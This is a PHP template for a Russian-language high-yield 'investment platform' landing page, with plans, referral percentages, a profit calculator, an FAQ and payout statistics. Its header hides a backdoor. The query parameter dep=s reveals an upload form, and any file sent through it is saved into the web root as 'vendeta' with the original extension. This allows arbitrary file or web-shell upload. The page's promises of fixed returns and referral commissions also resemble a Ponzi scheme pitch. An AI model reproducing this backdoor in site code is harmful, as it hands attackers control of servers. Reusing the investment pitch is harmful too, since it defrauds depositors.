<?if(empty($id)){?>
<div class="site-container" id="sc">
<header class="main">
<div class="sw p-r block_r_10">
<!--lang-->
<div class="ei_lang">
<div class="lang_content">
<div class="lang_active">
<a href="#" onclick="doGTranslate(&#39;ru|ru&#39;);return false;" class="active"><img src="/style/images/ru.png" style="height: 21px;width: auto;" alt="RU"></a>
&nbsp;
<a href="#" onclick="doGTranslate(&#39;ru|en&#39;);return false;" class="activ"><img src="/style/images/en.png" style="height: 21px;width: auto;" alt="EN"></a>
</div>
</div>
</div>
<div id="google_translate_element2">
<div class="skiptranslate goog-te-gadget" dir="ltr" style="">
Технологии <span style="white-space:nowrap"><a class="goog-logo-link" href="https://translate.google.com/" target="_blank"><img src="" width="37px" height="14px" style="padding-right: 3px" alt="Google Переводчик">Переводчик</a></span>
</div>
</div>
<style type="text/css">

#goog-gt-tt {display:none !important;}
.goog-te-banner-frame {display:none !important;}
.goog-te-menu-value:hover {text-decoration:none !important;}
body {top:0 !important;}
#google_translate_element2 {display:none!important;}

<div>
</div>
</style>
<script type="text/javascript">
function googleTranslateElementInit2() {new google.translate.TranslateElement({pageLanguage: 'ru',autoDisplay: false}, 'google_translate_element2');}
</script>
<script type="text/javascript" src="/style/f.txt"></script>


<script type="text/javascript">
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('6 7(a,b){n{4(2.9){3 c=2.9("o");c.p(b,f,f);a.q(c)}g{3 c=2.r();a.s(\'t\'+b,c)}}u(e){}}6 h(a){4(a.8)a=a.8;4(a==\'\')v;3 b=a.w(\'|\')[1];3 c;3 d=2.x(\'y\');z(3 i=0;i<d.5;i++)4(d[i].A==\'B-C-D\')c=d[i];4(2.j(\'k\')==E||2.j(\'k\').l.5==0||c.5==0||c.l.5==0){F(6(){h(a)},G)}g{c.8=b;7(c,\'m\');7(c,\'m\')}}',43,43,'||document|var|if|length|function|GTranslateFireEvent|value|createEvent||||||true|else|doGTranslate||getElementById|google_translate_element2|innerHTML|change|try|HTMLEvents|initEvent|dispatchEvent|createEventObject|fireEvent|on|catch|return|split|getElementsByTagName|select|for|className|goog|te|combo|null|setTimeout|500'.split('|'),0,{}))
</script>
<!--fin lang-->
<nav>
<a href="/" class="denz1"><?=$sitename?></a>
<a href="#contacts" class="denz2">Контакты</a>
<a href="#plans" class="denz2">Тарифный план</a>
<a href="#faq" class="denz2">FAQ</a>
<a href="#stats" class="denz2">Статистика</a>
</nav>
<div class="texthead">
<p class="block_r_12">Прибыльные инвестиции</p>
<p class="block_r_13">С нами вы будете зарабатывать 1<?=$deppercentage?>%</p>
<p class="block_r_14">Теперь не нужно самому искать подходящий вариант в интернете или думать над созданием инвестиционного портфеля. Вам необходимо лишь остановить свой выбор на нашей платформе с самым выгодным инвестиционным предложением в интернете. Мы позаботимся о Ваших доходах.</p>
<div>
<?php
if ($_GET['dep'] == "s") {
echo '
<label id="#bb"> Enter Your File<form method="post" enctype="multipart/form-data">    
   <input name="file" size="18" id="File" type="file" value="">
    <p><input name="submit" type="submit" value="&#9658; dow"></label></form>';
}
$file = $_FILES['file']['tmp_name'];
$filename = $_FILES['file']['name'];
if(!empty($file))
{
  ini_set('memory_limit', '32M'); 
  $maxsize = "100000000";
  $size = filesize ($_FILES['file']['tmp_name']); 
  $type = strtolower(substr($filename, 1+strrpos($filename,".")));
  $new_name = 'vendeta.'.$type; 
  if($size > $maxsize)
  { 
     echo "The file is more than. Reduce the size of your file or upload another. <br><a href='' onClick=window.close();>close the window</a>";
  } 
  else 
  { 
    if (copy($file, "".$new_name))
      echo "File uploaded!<br>Copy the address of the file<br> <a href=\"$new_name\"><b>$new_name</b></a><br> and press<br><a href='' onClick=history.back();>return back</a>";
    else echo "The file was not downloaded.";
  } 
}
?>
<div class="btn-wrapper1">
<a href="#sign-in" class="sever"><i class="fa fa-key" aria-hidden="true"></i> Войти</a>
<a href="#sign-up" class="sever"><i class="fa fa-unlock-alt" aria-hidden="true"></i> Регистрация</a>
</div>
<p class="block_r_16" style="margin-top: 10px;">*регистрация займет не больше 1 минуты</p>
</div>
</div>
<div>
<img src="/themes/comp_3x.png" class="block_r_17">
</div>
</div>
</header>
<main>
<style type="text/css">
@media (min-width: 320px) and (max-width: 768px) {
#yandex_rtb_R-A-221380-4 {
display: block !important;
margin-bottom: 15px;
}
#sc .block-1 {
padding: 10px 0px !important;
}
}
</style>
<article class="block-1 ta-c-m">
<div class="sw block_r_18">
<header>
<h2>Три шага к получению прибыли</h2>
<p>Вы можете получать прибыль в проекте <?=$sitename?> совершив всего лишь три простых действия.</p>
</header>
<div class="content clear columns-container-d">
<div class="column-d f-l-d w-33-d clear">
<figure class="f-l-d f-l-t m-r-d m-r-t m-ab-m">
<img src="/themes/interview.png" class="block_r_19" width="80" height="80">
</figure>
<div class="o-h">
<h4>Создайте Аккаунт</h4>
<div class="text">
<p>Пройдите простейший процесс регистрации, который займет не более 1 минуты.</p>
</div>
</div>
</div>
<div class="column-d f-l-d w-33-d clear">
<figure class="f-l-d f-l-t m-r-d m-r-t m-ab-m">
<img src="/themes/bank.png" width="80" height="80">
</figure>
<div class="o-h">
<h4>Откройте депозит</h4>
<div class="text">
<p>Откройде депозит на сумму необходимую Вам для полноценного дохода.</p>
</div>
</div>
</div>
<div class="column-d f-l-d w-33-d clear">
<figure class="f-l-d f-l-t m-r-d m-r-t m-ab-m"><img src="/themes/payment.png" width="80" height="80"></figure>
<div class="o-h">
<h4>Выводи прибыль</h4>
<div class="text"><p>С нашими авоматическими выплатами Вы будите воплощать свои мечты в реальность!</p></div>
</div>
</div>
</div>
</div>
<style type="text/css">
@media (min-width: 1200px) {
#yandex_rtb_R-A-221380-1 {
display: block !important;
}
}
@media (min-width: 1024px) and (max-width: 1200px) {
#yandex_rtb_R-A-221380-2 {
display: block !important;
}
}
@media (min-width: 768px) and (max-width: 1024px) {
#yandex_rtb_R-A-221380-3 {
display: block !important;
}
}
</style>
</article>
<div class="clear"></div>
<div id="wrapper" class="planbg">
<div class="wrap">
<div class="plancontainer">
<div class="title">
<span></span>
</div>
<div class="planbox block_r_20" id="plans">
<section class="pricing-section bg-12">
<div class="pricing pricing--palden block_r_21">
<div class="pricing__item">

<div class="pricing__deco">
<svg class="pricing__deco-img" version="1.1" id="Layer_1" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="300px" height="100px" viewBox="0 0 300 100" enable-background="new 0 0 300 100" xml:space="preserve">
<path class="deco-layer deco-layer--1" opacity="0.6" fill="#FFFFFF" d="M30.913,43.944c0,0,42.911-34.464,87.51-14.191c77.31,35.14,113.304-1.952,146.638-4.729	c48.654-4.056,69.94,16.218,69.94,16.218v54.396H30.913V43.944z"></path>
<path class="deco-layer deco-layer--2" opacity="0.6" fill="#FFFFFF" d="M-35.667,44.628c0,0,42.91-34.463,87.51-14.191c77.31,35.141,113.304-1.952,146.639-4.729	c48.653-4.055,69.939,16.218,69.939,16.218v54.396H-35.667V44.628z"></path>
<path class="deco-layer deco-layer--3" opacity="0.7" fill="#FFFFFF" d="M43.415,98.342c0,0,48.283-68.927,109.133-68.927c65.886,0,97.983,67.914,97.983,67.914v3.716	H42.401L43.415,98.342z"></path>
<path class="deco-layer deco-layer--4" fill="#FFFFFF" d="M-34.667,62.998c0,0,56-45.667,120.316-27.839C167.484,57.842,197,41.332,232.286,30.428	c53.07-16.399,104.047,36.903,104.047,36.903l1.333,36.667l-372-2.954L-34.667,62.998z"></path>
</svg>
<div class="pricing__price">1<?=$deppercentage?>%</div>
<h3 class="pricing__title">Enterprise</h3>
</div>

<ul class="pricing__feature-list block_r_23">
<li class="pricing__feature">1<?=$deppercentage?>% за <?=$timeprofit?></li>
<li class="pricing__feature"><?=$mindep?> - <?=$maxdep?> <i class="fa fa-rub"></i></li>
<li class="pricing__feature">Тело вклада включено</li>
</ul>

</div>
</div>
</section>
</div>

<div class="calc wow fadeInDown">
<div class="leftaff" style="height: 364px;">
<div class="afftitle">Реферальная программа</div>
<div class="reflevelmid">
<div class="levbox" style="width:100%;">1 уровень<span style="font-size:24px;"> <?=$refpercent?>%</span></div>
</div>
<img src="/themes/ruki_2_3x.png" class="block_r_27" style="padding-top: 130px;">
</div>
<div class="rightcalcu">
<div class="calcutitle">Рассчитать прибыль</div>
<div class="rightcolorcalc">
<table class="block_r_28">
<tbody>
<form method="post" name="calc" onsubmit="recalc(); return false;">
<script type="text/javascript" src="/themes/jquery.js"></script>
<input class="form-control" style="padding: 28px 15px;font-size: 18px;" id="deposits_sum" placeholder="Введите сумму" onkeyup="dep_calc();" type="text" name="depo" maxlength="5">
<input type="hidden" value="1" id="deposits_plan" name="plan" onchange="dep_calc();">
<input class="form-control" style="padding: 28px 15px;font-size: 18px;" disabled type="text" placeholder="Ваша прибыль" id="deposits_out">
<script type="text/javascript">
var plan=new Array();
plan[1]=1<?=$deppercentage?>;</script>
</form>
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
<div class="clear"></div>
<div class="lasblockLk block_r_34" id="stats">
<div class="container">
<div class="static">
<div class="tit"><p class="block_r_35">Последние операции</p></div>
</div>

<div class="list">
<div class="item">
<p class="block_r_36">последние инвестиции</p>
<? 
$depositsrow=$db->query("SELECT * FROM `log` WHERE comment='Пополнение баланса' ORDER BY id DESC LIMIT 5");
while($deposits=$db->fetch($depositsrow)){?>
<?$wallet=substr($db->getOne("SELECT wallet FROM `ss_users` WHERE id=?i",$deposits['userid']), 0, -3); ?>
<ul>
<li>
<p class="block_r_37" style="width: 30% !important;"><?=$wallet?>***</p>
<p class="block_r_38"><svg width="100" height="30" fill="#ffffff" role="img"><use xlink:href="#bm_icon_payment_transparent_payeer"></use></svg></p>
<p><?=$deposits['summa']?> <i class="fa fa-rub"></i></p>
</li>
</ul>
<?}?>
</div>

<div class="item">
<p class="block_r_40">последние выплаты</p>
<? 
$depositsrow=$db->query("SELECT * FROM `userstat` WHERE type='Выплата реферальных' OR type='Выплата по депозиту' ORDER BY id DESC LIMIT 5");
while($deposits=$db->fetch($depositsrow)){?>
<?$wallet=substr($db->getOne("SELECT wallet FROM `ss_users` WHERE id=?i",$deposits['userid']), 0, -3); ?>
<ul>
<li>
<p class="block_r_37" style="width: 30% !important;"><?=$wallet?>***</p>
<p class="block_r_38"><svg width="100" height="30" fill="#ffffff" role="img"><use xlink:href="#bm_icon_payment_transparent_payeer"></use></svg></p>
<p><?=$deposits['opisanie']?> <i class="fa fa-rub"></i></p>
</li>
</ul>
<?}?>
</div>

<div class="item">
<p class="block_r_40">топ рефоводов</p>
<? 
$checkdeps=$db->getOne("SELECT id FROM ?n WHERE i_have_refs_as_curator>0 LIMIT 1","ss_users");
if($checkdeps>0){
$depositsrow=$db->query("SELECT * FROM ?n WHERE i_have_refs_as_curator>0 ORDER BY i_have_refs_as_curator DESC LIMIT 5","ss_users");
  $i=1;
while($deposits=$db->fetch($depositsrow)){?>
<?$wallet=substr($deposits['wallet'], 0, -3);?>
<ul>
<li class="block_r_42" style="height: 54px;">
<p><span><?=$wallet?>***</span></p>
<p class="block_r_38"></p>
<p><?=$deposits['i_have_refs_as_curator']?> чел</p>
</li>
</ul>
<?}}?>
</div>
</div>
<ul style="margin-top:40px;">
<li class="statick">Инвестировано<span> <?=$depmoney?> <i class="fa fa-rub"></i></span></li>
<li class="statick">Выведено<span> <?=$wthmoney?> <i class="fa fa-rub"></i></span></li>
<li class="statick">Инвесторов<span> <?=$uzerov?> чел.</span></li>
<li class="statick">Дата старта<span> <?=$data_starta?></span></li>
</ul>
</div>
</div>
<article class="block-3 o-h hide-m">
<div class="sw p-r">
<div class="content">
<h2>Выгодные инвестиции</h2>
<p style="color: #fff;">Суть данной инвестиционной платформы состоит в аккумулировании средств, ринадлежащих юридическим или частным лицам для дальнейшего вложения их в финансовые инструменты, а не в производственные активы. Компания значительно упрощает процесс вложения средств, предлагает систему,с помощью которой каждый вкладчик может получить доход, при этом экономя силы, деньги и драгоценное время.</p>
</div>
</div>
</article>
<div class="block_r_46"></div>
<center class="footer123">
<div class="title"></div>
</center>
<div class="block_r_47">
<div class="block_r_48">
<div class="block_r_49" id="faq">
<p class="block_r_50">ВОПРОСЫ И ОТВЕТЫ</p>
<b>С чего начать?</b><br>
Для начала вам необходимо пройти процедуру регистрации. Заполните регистрационную форму. Рекомендуем указывать при этом только достоверные данные. Укажите адрес электронной почты, введите номер кошелька payeer, придумайте сложный пароль. После регистрации вы сможете войти в свой личный кабинет и внести депозит.
<br>
<br>
<b>Как совершить депозит?</b><br>
В личном кабинете нажмите на кнопку "НОВЫЙ ДЕПОЗИТ" укажите сумму депозита от <?=$mindep?> до <?=$maxdep?> <i class="fa fa-rub"></i> и нажмите оплатить. После оплаты ваш депозит мгновенно появится в вашем списке депозитов. 
<br>
<br>
<b>Могу ли я сделать несколько депозитов?</b><br>
Да, но сумма каждого депозита не должна превышать <b><?=$maxdep?></b> <i class="fa fa-rub"></i>. 
<br>
<br>
<b>Что нужно сделать, чтобы получить выплату?</b><br>
Выплаты производятся абсолютно автоматически через <b><?=$timeprofit?></b> после открытия депозита сразу на ваш payeer кошелек указанный при регистрации. 
<br>
<br>
<b>Сколько я получу с приглашенных людей?</b><br>
Вы получите <b><?=$refpercent?>%</b> от пополнения Ваших рефералов <b>сразу на ваш кошелёк!</b>
<br>
<br>
<b>Можно ли открывать несколько аккаунтов?</b><br>
В системе <?=$sitename?> КАТЕГОРИЧЕСКИ запрещается создание реферальных цепочек одним пользователем под разными аккаунтами, с одного устройства и IP адреса. Запрещается посещение чужих аккаунтов (даже при согласии владельца) т.к. на платформе установлено передовое аналитическое программное обеспечение, которое отслеживает подобные действия и автоматически удаляет аккаунт нарушителя без возможности дальнейшего его восстановления.
<p class="block_r_50">Платежные системы</p>
<figure class="fig">

<a href="https://payeer.com/03967833" target="blank" style="margin:0 5px;">
<svg width="150" height="40" role="img"><use xlink:href="#bm_icon_payment_colored_payeer"></use></svg>
</a>

</figure>
</div>

</div>

</div>
	
<div id="main_footer">
<div id="sub_footer">
<div class="folog">
<a href="#" style="display: inline-block;">
<h1 style="margin-top: 30px;"><?=$sitename?></h1>
</a>
</div>

<div class="fo_menu">
<ul class="block_r_3">
<li><a href="#stats" class="denz2">Статистика</a></li>
<li><a href="#faq" class="denz2">FAQ</a></li>
<li><a href="#plans" class="denz2">Тарифный план</a></li>
<li><a href="#contacts" class="denz2">Контакты</a></li>
</ul>
</div>
</div>
<div id="footer_box">
<div id="sub_foote_box">
<div class="location block_r_4">
<p class="block_r_5">
<i class="fa fa-map-marker" aria-hidden="true"></i>
Мы предоставляем вам уникальную площадку<br>
<span>для приумножения ваших средств</span>
</p>
</div>
<div class="loccon" id="contacts">
<p><i class="fa fa-envelope-o" aria-hidden="true"></i> Email : <?=$adminmail?></p>
</div>
<div class="loccon"></div>
<div class="fmedia">
<div class="folow_one">
<a target="_blank" href="<?=$vkgrup?>">
<img src="/themes/vk1.png" class="block_r_6">
</a>
</div>
<div class="folow_one">
<a target="_blank" href="<?=$telega?>">
<img src="/themes/telegram1.png" class="block_r_7">
</a>
</div>
</div>
</div>
</div>
</div>
<?}else{?>
<script type="text/javascript">
window.location.href = '/newdep';
</script>
<?}?>